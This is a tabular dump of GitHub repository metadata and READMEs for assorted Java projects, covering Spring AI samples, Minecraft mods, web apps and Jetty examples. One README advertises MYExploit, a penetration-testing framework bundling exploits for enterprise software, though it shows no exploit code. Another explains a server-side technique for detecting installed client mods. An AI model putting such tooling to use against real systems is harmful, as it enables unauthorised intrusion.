| [observability-vector-stores-pgvector](https://github.com/ThomasVitale/llm-apps-java-spring-ai/tree/main/10-observability/observability-vector-stores-pgvector) | Vector Store Observability for PGVector. |

### 15. Evaluation

_Coming soon_

### 16. Agents

_Coming soon_

## References and Additional Resources

* [Spring AI Reference Documentation](https://docs.spring.io/spring-ai/reference/index.html)

### Conferences

* [Introducing Spring AI by Christian Tzolov and Mark Pollack (Spring I/O 2024)](https://www.youtube.com/watch?v=umKbaXsiCOY)
* [Spring AI Is All You Need by Christian Tzolov (GOTO Amsterdam 2024)](https://www.youtube.com/watch?v=vuhMti8B5H0)
* [Concerto for Java and AI - Building Production-Ready LLM Applications by Thomas Vitale (Spring I/O 2024)](https://www.youtube.com/watch?v=3zTf8NxF-6o)

### Videos

* [Building Intelligent Applications With Spring AI by Dan Vega (JetBrains Live Stream)](https://www.youtube.com/watch?v=x6KmUyPWy2Q)
* [Spring AI Series by Dan Vega](https://www.youtube.com/playlist?list=PLZV0a2jwt22uoDm3LNDFvN6i2cAVU_HTH)
* [Spring AI Series by Craig Walls](https://www.youtube.com/playlist?list=PLH5OU4wXVJc9aECkMUVPCi8g3pzs8pZ3E)
* [Spring AI Series by Josh Long](https://www.youtube.com/playlist?list=PLgGXSWYM2FpMXvYb681axdH5JSLEPPyrz)

### Demos

* [Airline Customer Support (Marcus Hellberg)](https://github.com/marcushellberg/java-ai-playground/tree/spring-ai)
* [Composer Assistant (Thomas Vitale)](https://github.com/ThomasVitale/concerto-for-java-and-ai)
* [Document Assistant (Marcus Hellberg)](https://github.com/marcushellberg/docs-assistant)
* [Flight Booking (Christian Tzolov)](https://github.com/tzolov/playground-flight-booking)

### Workshops

* [Spring AI - Zero to Hero (Adib Saikali, Christian Tzolov)](https://github.com/asaikali/spring-ai-zero-to-hero/tree/main)
",0,0,1,Apache-2.0
HttpMarco/evelon,master,,5,4,3,Apache-2.0
jinganix/guess,master,"[![CI](https://github.com/jinganix/guess/actions/workflows/ci.yml/badge.svg)](https://github.com/jinganix/guess/actions/workflows/ci.yml)
[![License](http://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

[English Version](README.en.md)

# 猜猜谜题

本仓库是《猜猜谜题》微信小程序的源码，你可以[扫码体验](#qr-code)此小程序

- 前端使用`Typescript`开发，用`webpack`构建打包
- 后端使用`Java`和`Spring`框架开发，用`gradle`构建打包

## 运行项目

你需要先拉取项目源码，切换到项目根目录，使用gradle构建项目

```shell
git clone git@github.com:jinganix/guess.git
cd guess
./gradlew build
```

### 后端

#### 通过docker-compose运行

修改[application-local.yml](service/guess/src/main/resources/application-local.yml)以运行项目后端服务

- core.weapp.app-id: 微信小程序的`app-id`
- core.weapp.app-secret: 微信小程序的`app-secret`

如果你已经安装`docker`和`docker-compose`，可以通过以下命令启动后端服务

```shell
docker-compose up --build
```

#### 通过gradle运行

你需要安装jdk，对应的版本在[.tool-versions](.tool-versions)，并启动mysql数据库

修改[application-local.yml](service/guess/src/main/resources/application-local.yml)以运行项目后端服务

- core.weapp.app-id: 微信小程序的`app-id`
- core.weapp.app-secret: 微信小程序的`app-secret`
- core.url.db-mysql: mysql数据库连接地址，如`jdbc:mysql://127.0.0.1:3306/guess`
- spring.datasource.username: 数据库用户名
- spring.datasource.password: 数据库密码

以下命令可以在`Linux`或`MacOS`系统中启动后端服务

```shell
./gradlew service:guess:bootRun
```

以下命令可以在`Windows`系统中启动后端服务

```shell
./gradlew.bat service:guess:bootRun
```

### 前端

你需要安装[node.js](https://nodejs.org/en)，对应的版本在[.tool-versions](.tool-versions)

#### 运行命令

```shell
git clone git@github.com:jinganix/guess.git
cd guess/frontend/weapp
npm install
npm start
```

#### 开发者工具设置

1. 开发者工具导入项目的dist目录：`guess/frontend/weapp/dist`
2. 关闭域名校验

   <img src=""docs/devtools.setting.png"" alt=""Image"" width=""320"" height=""484"">

## <a id=""qr-code""></a>扫码体验

<img src=""docs/qrcode.jpg"" alt=""Image"" width=""240"" height=""240"">

## 贡献

如果你有兴趣报告/修复问题并直接为代码库做出贡献，请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 获取更多信息，了解我们期望的贡献内容以及如何开始
",0,1,9,
CleanroomMC/Fugue,master,"# Fugue
Fix dead mods. [Explain](https://www.etymonline.com/cn/word/fugue)

Also check [The Fugue Plane](https://forgottenrealms.fandom.com/wiki/Fugue_Plane).

## Download
https://github.com/CleanroomMC/Fugue/releases/latest

If you are still using 0.1.0 Cleanroom, use 0.5.4. But that's not recommended.

## List
* Charset
* CodeChickenLib
* Custom Main Menu
* Hammer Lib
* Forge Multipart
* Project:Red
* Solar Flux Reborn
* Xaero Plus
* EnderCore
* Lag Goggles
* Snow! Real Magic
* Botania Tweaks
* Advanced Rocketry
* Entity Distance
* FoamFix
* Shoulder Surfing Reloaded
* SplashAnimation
* Logistics Pipes
* OpenDisks
* OpenSecurity
* Enchantments Control
* GregTech CE Unofficial (Before 2.8.8)
* TFC Medicinal
* Mcjty Core
* LoliASM
* Howling Moon
* Custom NPCs
* XNet
* ZeroCore (ExtremeReactor)
* Smooth Font
* Water Power
* Survival Inc.
* Subauqatic (Temporary)
* Nothirium
* IC2C Extra
* Simply Hot Spring
* OpenModsLib
* Valkyrie (Temporary)
* ReplayMod
* Thaumic Speedup (Temporary)
* Astral Sorcery
* Armourer's Workshop
* Vampirism
* MAGE (Graphical Tweaks)
* Extra Utilities 2
* In Control!
* More Refined Storage
* Better Formatting Code
* 5zig
* Ears
* Colytra
* Crossbow
* Polyfrost mods
* Carry On

## Note
Add + to start of the file if it's not there.",56,4,1,GPL-3.0
find-xposed-magisk/LSPatch,main,"# LSPatch
LSPatch: A non-root Xposed framework extending from LSPosed|LSPatch：一款非Root的Xposed框架，是从LSPosed扩展而来的。| release备份在backup分支
",1,1,2,GPL-3.0
apple/pkl,main,,9,129,4,Apache-2.0
krkarma777/online-store,master,"# SEED: Open Market Project

## 설명

SEED는 JDK 17, Oracle DB 19c, Spring Boot, JPA, Thymeleaf를 기반으로 구현된 오픈마켓 웹 프로젝트입니다. 본 프로젝트는 테스트 주도 개발(TDD)과 RESTful 아키텍처를 중심으로 개발되어, 복잡한 시스템의 효과적인 관리와 고품질 코드 작성에 초점을 맞추고 있습니다. 사용자와 판매자 모두를 위한 다양한 기능을 포함하며, Spring Security 6, JWT, OAuth2 등 최신 웹 기술을 통해 사용자 경험과 보안성을 강화한 프로젝트입니다.

## 특징

- **RESTful Architecture**: 전통적인 MVC 패턴에서 API 중심 아키텍처로 전환하여, 코드 중복 감소와 유지보수 향상을 도모했습니다.
- **Security Implementations**: Spring Security와 JWT를 사용한 강력한 인증 및 권한 부여 프로세스 구현.
- **Dynamic Content Management**: Thymeleaf와 함께 다이나믹 웹 콘텐츠를 효율적으로 관리합니다.
- **E-Commerce Ready**: 다양한 결제 API 통합으로 사용자와 판매자에게 매끄러운 거래 경험 제공.

## 기술 스택

- JDK 17
- Oracle DB 19c
- Spring Boot
- JPA & Hibernate
- Thymeleaf
- Spring Security, OAuth2, JWT
- Daum Address API, CKEditor5, Chart JS
- Kakao and Naver Login API
- PayPal API

### 시작하기

- JDK 17
- Oracle DB 19c 설치 필요
- 필요한 모든 의존성은 `build.gradle`에 명시되어 있습니다.
  
1. 프로젝트 클론: git clone https://github.com/krkarma777/online-store

# 환경 설정

이 프로젝트를 올바르게 실행하기 위해서는 여러 환경 설정이 필요합니다. 아래에 필요한 구성 상세 정보를 제공합니다.

## 데이터베이스 구성

Oracle DB가 설치되어 있고 실행 중인지 확인하세요. 데이터베이스 연결을 위한 다음 환경 변수를 설정하세요.

- `SPRING_DATASOURCE_URL`: Oracle 데이터베이스 연결을 위한 JDBC URL.
- `SPRING_DATASOURCE_USERNAME`: 데이터베이스 사용자 이름.
- `SPRING_DATASOURCE_PASSWORD`: 데이터베이스 비밀번호.

로컬 설정 예시:
```properties
spring.datasource.url=jdbc:oracle:thin:@localhost:1522:orcl
spring.datasource.username=사용자이름
spring.datasource.password=비밀번호
```

## 이메일 서비스 구성
알림 및 확인 이메일을 보낼 수 있도록 메일 서버를 구성합니다.

```properties
spring.mail.host=smtp.gmail.com
spring.mail.port=587
spring.mail.username=yourEmail@gmail.com
spring.mail.password=앱비밀번호
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
```

## OAuth2 구성
각 서비스(카카오, 네이버 등)에 대한 클라이언트 ID, 클라이언트 비밀번호 및 리다이렉트 URI를 지정하여 OAuth2 제공자를 설정하세요. 이 값들은 버전 관리 시스템에 노출되지 않도록 안전하게 저장되어야 합니다.

```
spring.security.oauth2.client.registration.kakao.client-id=카카오클라이언트ID
spring.security.oauth2.client.registration.kakao.client-secret=카카오클라이언트비밀번호
spring.security.oauth2.client.registration.naver.client-id=네이버클라이언트ID
spring.security.oauth2.client.registration.naver.client-secret=네이버클라이언트비밀번호
```

## JWT 비밀 키
JWT 토큰을 서명하는 데 사용되는 비밀 키를 구성하세요. 이 키는 기밀로 유지되어야 합니다.

```
spring.jwt.secret=비밀키
```

## 애플리케이션 실행
모든 구성이 설정되면, 다음을 사용하여 애플리케이션을 실행할 수 있습니다.

```
./gradlew bootRun
```

## 추가 사항
- 요구 사항에 맞게 로깅 설정을 조정하여 디버깅 및 모니터링을 개선하세요.
- 처리할 예정인 파일 크기를 기반으로 멀티파트 설정을 수정하세요.
- 애플리케이션의 보안 설정을 주기적으로 검토하고 업데이트하여 강력한 보안을 유지하세요.

### Contributing

모든 종류의 기여를 환영합니다. 이슈 트래킹, 풀 리퀘스트 등을 통해 참여해주세요. 기여 전에 `CONTRIBUTING.md`를 확인해주세요.

### License

이 프로젝트는 MIT 라이센스를 따릅니다. 자세한 내용은 `LICENSE` 파일을 참조하십시오.

### Contact

오유준 - krkarma777@gmail.com

Project Link: [https://github.com/krkarma777/online-store](https://github.com/krkarma777/online-store)













- **Features and Screenshots**: [Link](https://krkarma777.notion.site/SEED-a2c911191c124a29b57b3f1f841c7264)

",0,17,1,MIT
udhayakumar2701/cricketTournamentSetting,main,,0,0,1,
zhaoyumi/MYExploit,main," <h1 align=""center"">🌟MYExploit-plus</h1>

![Static Badge](https://img.shields.io/badge/author-duidui-blue)


## 项目简介
二开修改的工具：https://github.com/achuna33/MYExploit

一款扩展性高的渗透测试框架渗透测试框架(完善中)

新增了泛微、用友、亿赛通等多种漏洞集合。


### 长期改Buging And 目前只支持部分EXP 利用 (慢慢写ing)

~~😘喜欢就给个star吧！~~

![image-20240110105025032](img/image-20240110105025032.png)


![image-20240110105111699](img/image-20240110105111699.png)

![image-20240110105403304](img/image-20240110105403304.png)

![image-20240110110508003](img/image-20240110110508003.png)

![image-20240110111028682](img/image-20240110111028682.png)

![image-20240110114453028](img/image-20240110114453028.png)



## 使用声明
本工具仅用于安全测试目的   
用于非法用途与开发者无关   

",1,0,1,
YuLin-Coder/No219CollegeTextbookWarehouse,master,"<p><h1 align=""center"">219.高校教材仓库管理系统</h1></p>

<p> 获取sql文件 QQ: 386869957 QQ群: 377586148 </p>
<p> [更多源码项目: 从戎源码网](https://armycodes.com/) </p>

## 简介

> 本代码来源于网络,仅供学习参考使用!
>
> 提供1.远程部署/2.修改代码/3.设计文档指导/4.框架代码讲解等服务
>
> admin 123456
>

## 项目介绍
基于java+swing的高校教材仓库管理系统：集成教材管理、班级管理、出版社管理、订购管理、出入库管理、统计等功能于一体的系统。

## 功能介绍

- 教材管理：教材信息的增删改查
- 班级管理：班级信息的增删改查
- 出版社管理：出版社增删改查
- 仓库人员管理：仓库人员的增删改查
- 订购管理：订购信息的增删改查
- 入库管理：教材入库，查询入库信息，入库表信息
- 出库管理：教材出库，查询出库信息，出库表信息
- 库存管理：库存查询
- 统计：订购入库出库统计

## 环境

- <b>IntelliJ IDEA 2021.3</b>

- <b>Mysql 5.7.26</b>

- <b>JDK 1.8</b>

## 运行截图

![](screenshot/1.png)

![](screenshot/2.png)

![](screenshot/3.png)

![](screenshot/4.png)

![](screenshot/5.png)

![](screenshot/6.png)

![](screenshot/7.png)

![](screenshot/8.png)

![](screenshot/9.png)",0,0,1,
xyzeva/ender-relay,main,"
<div align=""center"">

  <img width=""384"" height=""384"" src=""https://github.com/xyzeva/ender-relay/assets/133499694/0a9b6ff3-a7bd-42ba-ba3c-0845913f9917""></img>
  <h1>The Ender Relay</h1>
  <div>
    <a href=""https://modrinth.com/mod/end-relay""><img alt=""modrinth"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/available/modrinth_vector.svg""></a>
    <a href=""https://modrinth.com/mod/fabric-api""><img alt=""fabric-api"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/requires/fabric-api_vector.svg""></a>
<a href=""https://buymeacoffee.com/xyzeva""><img alt=""buymeacoffee-singular"" height=""56"" src=""https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/cozy/donate/buymeacoffee-singular_vector.svg""></a>
  </div>
</div>

This is a one-to-one replica of the [ender relay concept](https://www.youtube.com/watch?v=L1i4izl25V4) a youtuber by the name of Kenadian made.

The resources for the block were provided by Kenadian.

The Ender Relay is a block that can only be used in the end, it is crafted with a lodestone compass and can be charged like a respawn anchor, instead with a end crystal. When a player clicks the block, it teleports to the lodestone compasses location, ontop of the lodestone.

This completes the trilogy of the bed, respawn anchor by introducing a transportation item for the end dimension.

For more on the concept (and the mod, since its a 1:1), watch the video linked above!
",3,2,1,MIT
JustAlittleWolf/ModDetectionPreventer,1.20.4,"<h1 style=""text-align: center"">Mod Detection Preventer</h1>

⚠️ For now please stop using this mod. Another method of detecting mods has been found, and I am not able to resolve it at this time. Using this mod might cause you to get banned. ⚠️

<p align=""center"">
<img src=""src/main/resources/assets/moddetectionpreventer/icon.png"">
</p>

<p style=""text-align: center"">A simple mod that prevents a security vulnerability allowing servers to detect which mods are installed on
the client side.</p>


**While I try my best to keep this mod up to date, server admins might find a new method to access your mods-list. It is always recommended that you follow the server rules.**

## The Vulnerability

Minecraft has a feature that allows text (in chat, on signs, or in the bossbar) to be specified by a keybind the user
has set, or a translation key. The Client will then replace the translation key, or the keybind with the stored value.
This can be abused by the server by serving the client a sign with such a placeholder (for example Sodium:
`sodium.option_impact.low`). By immediately closing the sign screen, the client sends the edited text to the server
without ever seeing a sign open screen. The server can then detect wether you have that specific mod installed, by
checking if your client replaced the placeholder with the corresponding text (`sodium.option_impact.low -> Low`). If
you don't have Sodium installed, the placeholder will stay there
(`sodium.option_impact.low -> sodium.option_impact.low`).

This also works on the Anvil screen. The server could prompt you to open the anvil screen, with an item in the
renaming slot that has a translation key as it's name. The client would then rename the item to the corresponding
value and send an update to the server. (Huge thanks to Frog, `@croaak` on discord, for figuring this out)

This detection method works for any mod that has custom translations.

## The Fix

This mod fixes this issue by simply not resolving any translation or keybind placeholders on signs, except vanilla
ones. This makes it impossible for the server to use this method to detect installed mods.

To verify this works you can test it in a [test world](https://github.com/JustAlittleWolf/ModDetectionPreventer/raw/1.20.4/testWorld.zip).

## Intentions

~~While this feature can be used to prevent harm by detecting cheaters early, it is implemented improperly on some
servers, including [Cytooxien](CytooxienDetectedMods.md). Immediately banning players upon joining, simply because they
have tweakeroo installed, is unacceptable.~~
After a discussion with the developer of Cytooxien, they told me that players won't get banned for using tweakeroo, only kicked repeatedly.
",3,2,2,MIT
dnwwdwd/homieMatching,master,"# homie 匹配系统

> 作者：C1own
>
> [Github 主页](https://github.com/dnwwdwd)
>
> [CSDN 主页](https://blog.csdn.net/xyendjsj?type=blog)

![](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142339.png)



## 项目介绍

homie 匹配系统是一个移动端网页的在线云交友平台。实现了按标签匹配、查找用户，基于 Redis GEO 实现搜索附近用户，同时个人还可以建队、组队以打造个人学习队伍。除了添加好友、搜索好友外，还基于 Websocket 实现好友间私聊，方便用户寻找志同道合的学习搭子。

### 线上地址

[厚米匹配系统](http://hm.hejiajun.icu/)

### 前端地址

[homie 匹配前端地址](https://github.com/dnwwdwd/homieMatching-fronted)

### 后端地址

[homie 匹配后端地址](https://github.com/dnwwdwd/homieMatching)

### 项目部署教程

[homie 匹配部署教程](https://blog.csdn.net/xyendjsj/article/details/135921460?spm=1001.2014.3001.5501)



## 技术选型

### 前端

| 技术       | 用途                       | 版本   |
| ---------- | -------------------------- | ------ |
| Vue        | 前端经典框架，方便开发页面 | 3.3.11 |
| Vue-Router | 细致的导航控制             | 4      |
| Axios      | 发送请求至后端             | 1.6.2  |
| Vant       | 移动端样式组件库           | 4.8.0  |
| Vite       | 前端构建工具               | 5.0.8  |



### 后端

| 技术                 | 用途                                         | 版本    |
| -------------------- | -------------------------------------------- | ------- |
| Spring Boot          | 快构建 Spring 应用                           | 2.7.6   |
| JDK                  | Java 应用开发工具                            | 1.8     |
| MyBatis              | 操作数据库的框架                             | 3.5.2   |
| MyBatis-Plus         | MyBatis的增强框架，无需编写 SQL 语句         | 3.5.2   |
| MySQL                | 一个关系型数据库产品，用于存储数据           | 8.0..33 |
| Redis                | 一个非关系型数据库产品，用于存储数据         | 5.      |
| WebSocket            | 使得客户端和服务器之间的数据交换变得更加简单 | 2.4.1   |
| Lombok               | 实体类方法的快速生成工具                     |         |
| knife4j              | 在线接口文档生成的库                         | 2.0.9   |
| EasyExcel            | 快速、低占用地操作 Excel                     | 3.3.2   |
| hutool               | 强而全的工具库                               | 5.7.17  |
| Guava-Retrying       | 提供重试机制的库                             | 1.0.6   |
| Apache-commons-lang3 | 工具库                                       | 3.12.0  |



## 个人介绍

一个普通学校的大三学生，即将大四毕业了，正在做毕设。

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142050.jpg"" alt=""597f123b20d2e350ad2916f61c377ef"" style=""zoom: 33%;"" />

> 觉得项目还不错的同学可否给我项目点个 Star 呢？如果可以，小弟不胜感激，谢谢！

## 功能展示

登录

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143001.png"" alt=""image-20240609143001885"" style=""zoom: 67%;"" />

注册

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142952.png"" alt=""image-20240609142952622"" style=""zoom: 67%;"" />

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143117.png"" alt=""image-20240609143117032"" style=""zoom: 67%;"" />

首页

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145323.png"" alt=""image-20240609145323203"" style=""zoom:67%;"" />

按标签匹配相似用户

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145335.png"" alt=""image-20240609145335696"" style=""zoom:67%;"" />

按标签搜索用户

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145012.png"" alt=""image-20240609145012357"" style=""zoom:67%;"" />

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145002.png"" alt=""image-20240609145002577"" style=""zoom:67%;"" />

按距离搜索用户

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145122.png"" alt=""image-20240609145122634"" style=""zoom:67%;"" />

好友页面

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145434.png"" alt=""image-20240609145434695"" style=""zoom:67%;"" />

搜索好友

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609171231.png"" alt=""image-20240609171231079"" style=""zoom:67%;"" />

好友私聊

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145534.png"" alt=""image-20240609145534153"" style=""zoom:67%;"" />

建队

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145549.png"" alt=""image-20240609145549455"" style=""zoom:67%;"" />

个人页面

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143327.png"" alt=""image-20240609143327588"" style=""zoom: 67%;"" />



<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143357.png"" alt=""image-20240609143357705"" style=""zoom:67%;"" />



## 项目亮点

1. 基于 Spring AOP + Axios 实现前端登录拦截
2. 基于 Redis 实现分布式 Session 存储
3. 使用 Redis List 结构配合 Vue-infinite-loading 组件实现滑动加载
4. Spring Scheduling + Redis 分布式锁实现缓存预热
5. 了解编辑距离算法，可用于匹配相似字符串，单词校验
6. 基于 Redis GEO 存储用户地理微信信息，实现搜索附近用户
7. 基于 Redis 分布式锁防止用户重复入队
8. 通过 Guava 库实现重试机制，保证缓存数据一致性
9. 基于 Websocket 实现用户间私聊
10. 集成第三方库生成接口测试文档，方便测试项目接口
11. 熟悉 EasyExcel 的使用
12. 基于 Axios 封装请求实例，方便请求后端接口
13. 熟悉 Vant 组件库的使用
14. 熟悉 Vue3 setup 语法
15. 掌握 Vue-Router 基本使用



## 数据库表

> 如果大家拉取了后端源码，直接找到 sql/create_sql.sql 文件直接运行即可创建相应数据库和表结构

### 用户表

```sql
/*用户表*/
create table hjj.user
(
    id           bigint auto_increment comment 'id'
        primary key,
    username     varchar(256)                       null comment '用户昵称',
    userAccount  varchar(256)                       null comment '账户',
    avatarUrl    varchar(1024)                      null comment '用户头像' default 'https://www.keaitupian.cn/cjpic/frombd/0/253/936677050/470164789.jpg',
    gender       tinyint                            null comment '用户性别',
    profile      varchar(512)                       null comment '个人简介',
    userPassword varchar(512)                       not null comment '用户密码',
    phone        varchar(128)                       null comment '电话',
    email        varchar(512)                       null comment '邮箱',
    userStatus   int      default 0                 not null comment '状态 0 - 正常',
    createTime   datetime default CURRENT_TIMESTAMP null comment '创建时间',
    updateTime   datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete     tinyint  default 0                 not null comment '是否删除',
    userRole     int      default 0                 not null comment '用户角色 0 - 普通用户 1 - 管理员',
    planetCode   varchar(512)                       null comment '星球编号',
    tags         varchar(1024)                      null comment '标签列表(json)',
    longitude    decimal(10, 6)                     null comment '经度',
    dimension    decimal(10, 6)                     null comment '纬度'
)
    comment '用户';
```



### 队伍表

```sql
/*队伍表*/
create table if not exists hjj.team
(
    id           bigint auto_increment comment 'id'
        primary key,
    teamName   		varchar(256)                        not null comment '队伍名称',
    description 	varchar(1024)                       null comment ' 描述',
    maxNum        	int    default 1              		null comment '最大人数',
    expireTime      datetime							null comment '过期时间',
    userId 			bigint                              not null comment '队伍创建者/队长id',
    status         	tinyint default 0 		        	null comment '队伍状态 - 0 - 公开， 1 - 私有，2 - 加密
- ',
    password        varchar(512)                       null comment '队伍密码',
    createTime   	datetime default CURRENT_TIMESTAMP null comment '创建时间',
    updateTime   	datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete     	tinyint  default 0                 not null comment '是否删除'
)
    comment '队伍信息';
```



### 用户关系表

```sql
/*用户队伍关系*/
create table if not exists hjj.user_team
(
    id           bigint auto_increment comment 'id'
        primary key,
    userId 			bigint                             	comment '用户id',
    teamId 			bigint                             	comment '队伍id',
    joinTime   	datetime 							    comment '加入时间',
    createTime   	datetime default CURRENT_TIMESTAMP null comment '创建时间',
    updateTime   	datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete     	tinyint  default 0                 not null comment '是否删除'
)
    comment '用户队伍关系表';
```



### 好友表

```sql
/*好友表*/
create table hjj.friend
(
    id         bigint auto_increment comment 'id'
        primary key,
    userId     bigint                             not null comment '用户id（即自己id）',
    friendId   bigint                             not null comment '好友id',
    createTime datetime default CURRENT_TIMESTAMP null comment '创建时间',
    updateTime datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete   tinyint  default 0                 not null comment '是否删除'
)
    comment '好友表';
```



### 聊天表

```sql
/*聊天表*/
CREATE TABLE `chat`  (
                         `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '聊天记录id',
                         `fromId` bigint(20) NOT NULL COMMENT '发送消息id',
                         `toId` bigint(20) NULL DEFAULT NULL COMMENT '接收消息id',
                         `text` varchar(512) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
                         `chatType` tinyint(4) NOT NULL COMMENT '聊天类型 1-私聊 2-群聊',
                         `createTime` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                         `updateTime` datetime NULL DEFAULT CURRENT_TIMESTAMP,
                         `teamId` bigint(20) NULL DEFAULT NULL,
                         `isDelete` tinyint(4) NULL DEFAULT 0,
                         PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '聊天消息表' ROW_FORMAT = COMPACT;
```



## 项目初始化

### 前端

基础环境

- 软件：WebStorm 2022.2.5 / Vscode
- 环境：Node 版本：18.0.2

1）拉取项目

```bash
git clone https://github.com/dnwwdwd/homeiMatching-frontend.git
```

2）安装依赖

```bash
npm install
```

3）运行项目

```bash
npm run dev
```

4）打包项目

```bash
npm run build
```



### 数据库

1）对于拉去后端项目的同学直接运行 /sql/create_sql.ql 文件即可，前提电脑装了 MySQL（5.7 或 8.x 都可）

2）完事后将 application.yml 文件中数据库的账号密码改为自己的即可，对了此项目还用了 Redis，所以还要修改 Redis 的连接配置，有密码的加上密码

```yml
spring:
  profiles:
    active: dev
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  application:
    name: homieMatching
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/hjj?characterEncoding=UTF-8
    username: root
    password: 123456
  session:
    timeout: 86400
    store-type: redis
  redis:
    port: 6379
    host: localhost
    database: 0
server:
  port: 8080
  servlet:
    context-path: /api
    session:
      cookie:
        domain: localhost
        same-site: none
        secure: true
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: false
  global-config:
    db-config:
      logic-delete-field: isDelete
      logic-delete-value: 1
      logic-not-delete-value: 0
```



### 后端

基础环境

- 软件：IDEA 2023.1.6
- JDK 1.8 + MySQL 8.0.33 + Redis 5.x（最好是 5.x 以上） + Spring Boot 2.7.6 

> 更细的环境请看上面的技术选型，上面有具体的依赖关系和版本。
>
> **各位一定要注意在启动后端前，一定要先建好数据库表和安装 Redis，改好 yml 文件的连接信息再启动后端。**

1）拉取项目

```bash
git clone https://github.com/dnwwdwd/homieMatching.git
```

2）点击小圆圈重新加载所有 Maven 项目 ，下载依赖。

![image-20240609154936738](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609154936.png)

3）启动后端

找到 HomieMatchingApplication 主类，点击运行即可。

![image-20240609154419326](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609154419.png)



## 项目部署

[homie 匹配部署教程](https://blog.csdn.net/xyendjsj/article/details/135921460?spm=1001.2014.3001.5501)

跟着上面的教程一步一步来即可，不行你不会，如果中间有任何问题欢迎在这个网站，或者 CSDN 上，亦或者是微信上向我提问。觉得项目还不错的话，请给我点个 Star 呗，谢谢！
",0,2,2,
pahkey/sbb3,main,"## 점프 투 스프링부트3 책의 소스코드

* 위키독스 : https://wikidocs.net/book/7601


""점프 투 스프링부트""는 ""Spring Boot Board(SBB)""라는 이름의 게시판 서비스를 만들어가는 과정을 설명한 스프링부트 입문서이다. 자바 설치부터 시작하여 서비스 운영까지 웹 프로그래밍의 처음부터 끝까지 모든 것을 알 수 있도록 구성하였다.

이 책을 따라하다 보면 다음과 같은 웹 사이트가 만들어진다. (최종 결과물)

* [http://sbb.pybo.kr](http://sbb.pybo.kr)


책을 따라하다 생기는 질문은 위키독스의 댓글 또는 필자가 운영하는 디스코드를 활용하도록 하자.

* 질문과 답변 서비스 ""디스코드"" - [https://discord.gg/ZwqRRYRYkR](https://discord.gg/ZwqRRYRYkR)

",0,0,1,
jetty/jetty-examples,12.0.x,"![jetty logo](https://raw.githubusercontent.com/jetty/jetty.project/jetty-12.0.x/logos/jetty-logo-200.png)

[![12.0.x](https://github.com/jetty/jetty-examples/actions/workflows/ci.yml/badge.svg?branch-12.0.x)](https://github.com/jetty/jetty-examples/actions/workflows/ci.yml)

# Eclipse Jetty® - Examples

This is a collection of examples of how to use various features
present in the Eclipse Jetty server and Eclipse Jetty client.

There are a few major categories of examples.
## Embedded Examples

Using Embedded Jetty is extremely powerful way to include Jetty
in your Java application using Code (instead of configuration) to
setup a Jetty server or Jetty client.

Here you will see answers to common questions about how to 
integrate various features of Jetty, and also how to enable features
of 3rd party libraries within Jetty (such as JSP, REST, and CDI).

See [embedded/README.md][7] for a breakdown of embedded examples.

## Standalone Examples

The Standalone examples present fully formed `${jetty.base}` directories
that can be used to understand how to configure the jetty module system
and its various components to reach an end goal.

See [standalone/README.md][8] for a breakdown of standalone examples.

## Webapp Examples

A collection of various WAR files that can be used to demonstrate
how to use web and JVM features in Jetty.

See [webapps/README.md][9] for a breakdown of webapp examples.

---

### All Example Branches

| Branch       | Min JDK | EE   | Servlet | Namespace         | Supported                               |
|--------------|---------|------|---------|-------------------|-----------------------------------------|
| [12.0.x][6]  | 17      | EE10 | 6.0     | `jakarta.servlet` | Yes                                     |
| [12.0.x][6]  | 17      | EE9  | 5.0     | `jakarta.servlet` | Yes                                     |
| [12.0.x][6]  | 17      | EE8  | 4.0     | `javax.servlet`   | Yes                                     |
